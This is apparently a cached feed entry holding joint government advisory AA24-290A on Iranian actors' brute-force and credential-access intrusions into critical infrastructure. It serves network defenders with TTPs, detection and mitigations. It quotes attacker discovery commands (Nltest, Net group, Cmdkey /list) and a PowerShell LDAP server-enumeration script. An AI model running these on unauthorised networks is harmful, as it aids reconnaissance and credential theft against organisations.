;; -*- coding: utf-8 -*-
(("CISA Cybersecurity Advisories" nil "https://www.cisa.gov/" (26403 44418 557526 754000) feed 0 nil nil ((title nil "CISA Cybersecurity Advisories") (link nil "https://www.cisa.gov/") (description nil) (language nil "en") (item nil (title nil "Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-290a") (description nil "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), the Communications Security Establishment Canada (CSE), the Australian Federal Police (AFP), and Australian Signals Directorate's Australian Cyber Security Centre (ASD's ACSC) are releasing this joint Cybersecurity Advisory to warn network defenders of Iranian cyber actors’ use of brute force and other techniques to compromise organizations across multiple critical infrastructure sectors, including the healthcare and public health (HPH), government, information technology, engineering, and energy sectors. The actors likely aim to obtain credentials and information describing the victim’s network that can then be sold to enable access to cybercriminals.</p>
<p>Since October 2023, Iranian actors have used brute force, such as password spraying, and multifactor authentication (MFA) ‘push bombing’ to compromise user accounts and obtain access to organizations. The actors frequently modified MFA registrations, enabling persistent access. The actors performed discovery on the compromised networks to obtain additional credentials and identify other information that could be used to gain additional points of access. The authoring agencies assess the Iranian actors sell this information on cybercriminal forums to actors who may use the information to conduct additional malicious activity.</p>
<p>This advisory provides the actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs). The information is derived from FBI engagements with entities impacted by this malicious activity.</p>
<p>The authoring agencies recommend critical infrastructure organizations follow the guidance provided in the <strong>Mitigations</strong> section. At a minimum, organizations should ensure all accounts use strong passwords and register a second form of authentication.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/aa24-290a-iranian-cyber-actors-conduct-brute-force-and-credential-access-activity.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-290A Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations</a>
    <span class=\"c-file__size\">(PDF,       794.32 KB
  )</span>
  </div>
</div>
<p>For a downloadable list of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/AA24-290A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-290A STIX XML</a>
    <span class=\"c-file__size\">(XML,       96.61 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/AA24-290A.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-290A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       81.92 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:&nbsp;</strong>This advisory uses the&nbsp;<a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup></a><a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\"> for Enterprise</a> framework, version 15. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section in <strong>Appendix A</strong> for a table of the actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3><strong>Overview of Activity</strong></h3>
<p>The actors likely conduct reconnaissance operations to gather victim identity [<a href=\"https://attack.mitre.org/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a>] information. Once obtained, the actors gain persistent access to victim networks frequently via brute force [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/\" title=\"Brute Force\">T1110</a>]. After gaining access, the actors use a variety of techniques to further gather credentials, escalate privileges, and gain information about the entity’s systems and network. The actors also move laterally and download information that could assist other actors with access and exploitation.</p>
<h3><strong>Initial Access and Persistence</strong></h3>
<p>The actors use valid user and group email accounts [<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>], frequently obtained via brute force such as password spraying [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>] although other times via unknown methods, to obtain initial access to Microsoft 365, Azure [<a href=\"https://attack.mitre.org/techniques/T1078/004/\" title=\"Valid Accounts: Cloud Accounts\">T1078.004</a>], and Citrix systems [<a href=\"https://attack.mitre.org/techniques/T1133/\" title=\"External Remote Services\">T1133</a>]. In some cases where push notification-based MFA was enabled, the actors send MFA requests to legitimate users seeking acceptance of the request. This technique—bombarding users with mobile phone push notifications until the user either approves the request by accident or stops the notifications— is known as “MFA fatigue” or “push bombing” [<a href=\"https://attack.mitre.org/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a>].</p>
<p>Once the threat actors gain access to an account, they frequently register their devices with MFA to protect their access to the environment via the valid account:</p>
<ul>
<li>In two confirmed compromises, the actors leveraged a compromised user’s open registration for MFA [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>] to register the actor’s own device [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/005/\" title=\"Account Manipulation: Device Registration\">T1098.005</a>] to access the environment.</li>
<li>In another confirmed compromise, the actors used a self-service password reset (SSPR) tool associated with a public facing Active Directory Federation Service (ADFS) to reset the accounts with expired passwords [<a href=\"https://attack.mitre.org/techniques/T1484/002/\" title=\"Domain or Tenant Policy Modification: Trust Modification\">T1484.002</a>] and then registered MFA through Okta for compromised accounts without MFA already enabled [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556\" title=\"Modify Authentication Process\">T1556</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a>].</li>
</ul>
<p>The actors frequently conduct their activity using a virtual private network (VPN) service [<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]. Several of the IP addresses in the actors’ malicious activity originate from exit nodes tied to the Private Internet Access VPN service.</p>
<h3><strong>Lateral Movement</strong></h3>
<p>The actors use Remote Desktop Protocol (RDP) for lateral movement&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>]. In one instance, the actors used Microsoft Word to open PowerShell to launch the RDP binary&nbsp;<code>mstsc.exe</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1202\" title=\"Indirect Command Execution\">T1202</a><u>]</u>.</p>
<h3><strong>Credential Access</strong></h3>
<p>The actors likely use open-source tools and methodologies to gather more credentials.&nbsp;The actors performed Kerberos Service Principal Name (SPN) enumeration of several service accounts and received Kerberos tickets [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. In one instance, the actors used the Active Directory (AD) Microsoft Graph Application Program Interface (API) PowerShell application likely to perform a directory dump of all AD accounts. Also, the actors imported the tool [<a href=\"https://attack.mitre.org/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>] <code>DomainPasswordSpray.ps1</code>, which is openly available on GitHub&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1588/002/\" title=\"Obtain Capabilities: Tool\">T1588.002</a>], likely to conduct password spraying. The actors also used the command <code>Cmdkey /list</code>, likely to display usernames and credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1555/\">T1555</a>].</p>
<h3><strong>Privilege Escalation</strong></h3>
<p>In one instance, the actors attempted impersonation of the domain controller, likely by exploiting Microsoft’s Netlogon (also known as ”Zerologon”) privilege escalation vulnerability (CVE-2020-1472) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>].</p>
<h3><strong>Discovery</strong></h3>
<p>The actors leverage&nbsp;living off the land (LOTL) to gain knowledge about the target systems and internal networks. The actors used the following Windows command-line tools to gather information about domain controllers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1018\" title=\"Remote System Discovery\">T1018</a>], trusted domains [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a>], lists of domain administrators, and enterprise administrators [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/003/\" title=\"Permission Groups Discovery: Cloud Groups\">T1069.003</a>]:</p>
<ul>
<li><code>Nltest /dclist</code></li>
<li><code>Nltest /domain_trusts</code></li>
<li><a><code>Nltest /domain_trusts</code></a><code>/all_trusts</code></li>
<li><code>Net group “Enterprise admins” /domain</code></li>
<li><code>Net group “Domain admins” /domain</code></li>
</ul>
<p>Next, the actors used the following Lightweight Directory Access Protocol (LDAP) query in PowerShell [<a href=\"https://attack.mitre.org/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>]to search the AD for computer display names, operating systems, descriptions, and distinguished names [<a href=\"https://attack.mitre.org/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>].</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$i=0</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$D= [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$L='LDAP://' . $D</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$D = [ADSI]$L</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$Date = $((Get-Date).AddDays(-90).ToFileTime())</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$str = '(&amp;(objectcategory=computer)(operatingSystem=*serv*)(|(lastlogon&gt;='+$Date+')(lastlogontimestamp&gt;='+$Date+')))'</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s = [adsisearcher]$str</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.searchRoot = $L.$D.distinguishedName</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('cn') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('operatingsystem') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('description') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('distinguishedName') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Foreach ($CA in $s.FindAll()) {</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Write-Host $CA.Properties.Item('cn')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA.Properties.Item('operatingsystem')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA. Properties.Item('description')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA.Properties.Item('distinguishedName')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$i++</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>}</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Write-host Total servers: $i</code></p>
<h3><strong>Command and Control</strong></h3>
<p>On one occasion, using&nbsp;msedge.exe, the actors likely made outbound connections to Cobalt Strike Beacon command and control (C2) infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>].</p>
<h3><strong>Exfiltration and Collection</strong></h3>
<p>In a couple instances, while logged in to victim accounts, the actors downloaded files related to gaining remote access to the organization and to the organization’s inventory [<a href=\"https://attack.mitre.org/techniques/T1005/\" title=\"Data from Local System\">T1005</a>], likely exfiltrating the files to further persist in the victim network or to sell the information online.</p>
<h2><strong>Detection</strong></h2>
<p>To detect brute force activity, the authoring agencies recommend reviewing authentication logs for system and application login failures of valid accounts and looking for multiple, failed authentication attempts across all accounts.</p>
<p>To detect the use of compromised credentials in combination with virtual infrastructure, the authoring agencies recommend the following steps:</p>
<ul>
<li>Look for “impossible logins,” such as suspicious logins with changing usernames, user agent strings, and IP address combinations or logins where IP addresses do not align to the user’s expected geographic location.</li>
<li>Look for one IP used for multiple accounts, excluding expected logins.</li>
<li>Look for “impossible travel.” Impossible travel occurs when a user logs in from multiple IP addresses with significant geographic distance (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the period between the logins). <strong>Note:</strong> Implementing this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting into networks.</li>
<li>Look for MFA registrations with MFA in unexpected locales or from unfamiliar devices.</li>
<li>Look for processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the&nbsp;<code>ntds.dit</code> file from a domain controller.</li>
<li>Look for suspicious privileged account use after resetting passwords or applying user account mitigations.</li>
<li>Look for unusual activity in typically dormant accounts.</li>
<li>Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.</li>
</ul>
<h2><strong>Mitigations</strong></h2>
<p>The authoring agencies recommend organizations implement the mitigations below to improve organizations’ cybersecurity posture based on the actors’ TTPs described in this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA. The CPGs, which are organized to align to the National Institute of Standards and Technology (NIST) Cybersecurity Framework, are a subset of cybersecurity practices, aimed at meaningfully reducing risks to both critical infrastructure operations and the American people. These voluntary CPGs strive to help small- and medium-sized organizations kick-start their cybersecurity efforts by prioritizing investment in a limited number of essential actions with high-impact security outcomes. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li>Review IT helpdesk password management related to initial passwords, password resets for user lockouts, and shared accounts. IT helpdesk password procedures may not align to company policy for user verification or password strength, creating a security gap. Avoid common passwords (e.g. “Spring2024” or “Password123!”).</li>
<li>Disable user accounts and access to organizational resources for departing staff [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#RevokingCredentialsforDepartingEmployees2D\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.D</a>]. Disabling accounts can minimize system exposure, removing options actors can leverage for entry into the system. Similarly, create new user accounts as close as possible to an employee’s start date.</li>
<li>Implement phishing-resistant MFA [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.H</a>]. See CISA’s resources&nbsp;<a href=\"https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">Phishing-Resistant Multifactor Authentication</a>&nbsp;and&nbsp;<a href=\"https://www.cisa.gov/MFA\" title=\"More than a Password\">More than a Password</a> for additional information on strengthening user credentials.</li>
<li>Continuously review MFA settings to ensure coverage over all active, internet-facing protocols to ensure no exploitable services are exposed [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.W</a>].</li>
<li>Provide basic cybersecurity training to users [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#BasicCybersecurityTraining2I\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.I</a>] covering concepts such as:
<ul>
<li>Detecting unsuccessful login attempts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectionofUnsuccessfulAutomatedLoginAttempts2G\">CPG 2.G</a>].</li>
<li>Having users deny MFA requests they have not generated.</li>
<li>Ensuring users with MFA-enabled accounts have MFA set up appropriately.</li>
</ul>
</li>
<li>Ensure password policies align with the latest <a href=\"https://pages.nist.gov/800-63-4/sp800-63.html\" title=\"NIST Digital Identity Guidelines\">NIST Digital Identity Guidelines</a>.
<ul>
<li>Meeting the minimum password strength [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MinimumPasswordStrength2B\">CPG 2.B</a>] by creating a password using 8-64 nonstandard characters and long passphrases, when possible.</li>
</ul>
</li>
<li>Disable the use of RC4 for Kerberos authentication.</li>
</ul>
<p>These mitigations apply to critical infrastructure entities across sectors.</p>
<p>The authoring agencies also recommend software manufacturers incorporate secure by design principles and tactics into their software development practices to protect their customers against actors using compromised credentials, thereby strengthening the security posture of their customers. &nbsp;For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design-and-default\" title=\"Secure-by-Design\">joint guide</a>.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating organization security programs against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 1 to Table 12)</strong>.</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Contact Information</strong></h2>
<p>Organizations are encouraged to report suspicious or criminal activity related to information in this advisory to:</p>
<ul>
<li>CISA via CISA’s 24/7 Operations Center [<a href=\"mailto:report@cisa.gov\">report@cisa.gov</a> or 1-844-Say-CISA (1-844-729-2472)] or your local <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"FBI Field Offices\">FBI field office</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</li>
<li>For NSA cybersecurity guidance inquiries, contact <a href=\"mailto:CybersecurityReports@nsa.gov\">CybersecurityReports@nsa.gov</a>.</li>
</ul>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>
<p>Intrusion events connected to this Iranian group may also include a different set of cyber actors–likely the third-party actors who purchased access from the Iranian group via cybercriminal forums or other channels. As a result, some TTPs and IOCs noted in this advisory may be tied to these third-party actors, not the Iranian actors. The TTPs and IOCs are in the advisory to provide recipients the most complete picture of malicious activity that may be observed on compromised networks. However, exercise caution if formulating attribution assessments based solely on matching TTPs and IOCs.</p>
<h2><strong>Version History</strong></h2>
<p><strong>October 16, 2024: </strong>Initial version.</p>
<h2><strong>Appendix A: MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Tables 1–12</strong>&nbsp;for all referenced actors’ tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"Decider Tool\">Decider Tool</a>.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
